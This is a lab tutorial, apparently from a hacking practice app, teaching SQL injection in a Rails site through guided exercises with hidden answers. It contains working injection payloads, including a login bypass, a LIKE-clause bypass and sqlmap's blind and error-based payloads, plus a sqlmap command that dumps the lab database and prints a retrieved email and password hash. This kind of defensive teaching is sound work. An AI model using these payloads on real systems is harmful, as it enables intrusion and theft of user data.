# SQL Injection

### Background:

A SQL injection vulnerability occurs whenever user input is used in a SQL query without any escaping, allowing the user to append and execute their own SQL.
For example, the following query would be vulnerable to SQL injection if constructed with a user-supplied name and password:

```ruby
"SELECT * FROM users WHERE name='" + name + "' and password='" + password + "' LIMIT 1"
```

We can provide a password like `' or '1'='1` and it would cause the full query to become:

```sql
SELECT * FROM users WHERE name='user' and password='' or '1'='1' LIMIT 1
```

This reads as:
- Select the first user where the name is `user` and the password is blank
- OR where the condition `'1'='1'` is true.

Since `'1'='1'` is always true, this would effectively select the first user, without needing to know their username or password.

When it comes to Rails, [ActiveRecord](http://guides.rubyonrails.org/active_record_basics.html) makes this easier to avoid. We almost never have to write full SQL queries like the example above. However, there are still some ways to get into trouble. For example, there are several [ActiveRecord query methods that do construct chunks of raw SQL](https://rails-sqli.org/), and can be very dangerous when combined with unescaped user input.

## Example

http://hack.jackmc.xyz/profiles/1

When visiting the above link, we see the profile with the id value of 1 as expected. However, if we provide an unexpected id value we can see a SQL error: http://hack.jackmc.xyz/profiles/test

```
ActiveRecord::StatementInvalid in ProfilesController#show
Mysql2::Error: Unknown column 'test' in 'where clause': SELECT `profiles`.* FROM `profiles` WHERE (id=test) LIMIT 1
```

Let's append some SQL to make this return a profile, even when providing it an invalid `id`: http://hack.jackmc.xyz/profiles/1337

Similar to the above admin login example, this will return the first profile: [http://hack.jackmc.xyz/profiles/1337%20or%20'a'='a'](http://hack.jackmc.xyz/profiles/1337%20or%20'a'='a')

---
## Try it out!
This app is vulnerable to SQL injection on the products page.

### Questions:
#### Can you identify the vulnerable parameter?
<details>
  <summary><b>Hint</b></summary>
  What characters would cause unexpected behaviour? The background section, and resources linked below should help with this.
</details>

<details>
  <summary><b>Answer</b></summary>
  The vulnerable parameter is <code>search</code>. This is evident when searching for something with a single quote <code>'</code>. Ex:
  http://hack.jackmc.xyz/products?utf8=✓&search=evil'&commit=
</details>

#### Can you use something similar to the `or 1=1` trick to return other products here?
<details>
  <summary><b>Hint</b></summary>
Look at the query that's being executed. The <code>LIKE</code> clause has wildcard characters on either side and makes this a bit trickier.
</details>

<details>
  <summary><b>Answer</b></summary>

[http://hack.jackmc.xyz/products?search=test%27or%271%25%27=%271](http://hack.jackmc.xyz/products?search=test%27or%271%25%27=%271)

This works because the final query will be:

```
SELECT `products`.* FROM `products` WHERE (user_id = 1 AND name LIKE '%test'or'1%'='1%')
```

And <code>'1%'='1%'</code> is also true.
</details>

#### What is the impact of this kind of bug? Are there common tools that help with exploitation?
<details>
  <summary><b>Hint</b></summary>
What else is in this database? Are we only concerned about access to the data?
</details>

<details>
  <summary><b>Answer</b></summary>
This is a very high impact vulnerability. It would allow access to anything in the same database. In this case that means not only the products of other users, but also their profile information and password hashes.
Note that access isn't the only concern here, since we can actually do whatever the current database user could do. This often means that modifying data or dropping tables is also possible.
<a href="https://sqlmap.org/">SQLmap</a> is a common tool for exploiting these types of flaws. Using SQLmap the database can be dumped quite easily, with a command such as:

```
python sqlmap.py -u http://hack.jackmc.xyz/products?search=pikachu \
--cookie="_learn_to_hack_session=<cookie value>" --dump
```
...
```
---
Parameter: search (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: search=pikachu') AND 2162=2162 AND ('mMpj'='mMpj

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: search=pikachu') AND (SELECT 1986 FROM(SELECT COUNT(*),CONCAT(0x7170716a71,(SELECT (ELT(1986=1986,1))),0x716a6a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ('KPfZ'='KPfZ

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
    Payload: search=pikachu') AND (SELECT * FROM (SELECT(SLEEP(5)))ROZg) AND ('DfLC'='DfLC
---
```
...
```
[16:09:13] [INFO] retrieved: dev@shopify.com
[16:09:14] [INFO] retrieved: $2a$11$85jaXEbLhrShlCYZC0x3COxpC74NZws3oCNb.fm5L9RUHKSxQ/ofS
[16:09:14] [INFO] retrieved: 1
[16:09:15] [INFO] retrieved: 2018-06-15 18:24:13
```

</details>

### Done?

There's one more of these hiding in the app! See if you can track it down.

### Resources:
https://www.owasp.org/index.php/SQL_Injection

https://rails-sqli.org/

http://gavinmiller.io/2015/fixing-sql-injection-vulnerabilities/

https://www.youtube.com/watch?v=2GHWAYys1is (2016 RailsConf Talk - "Will it inject?")
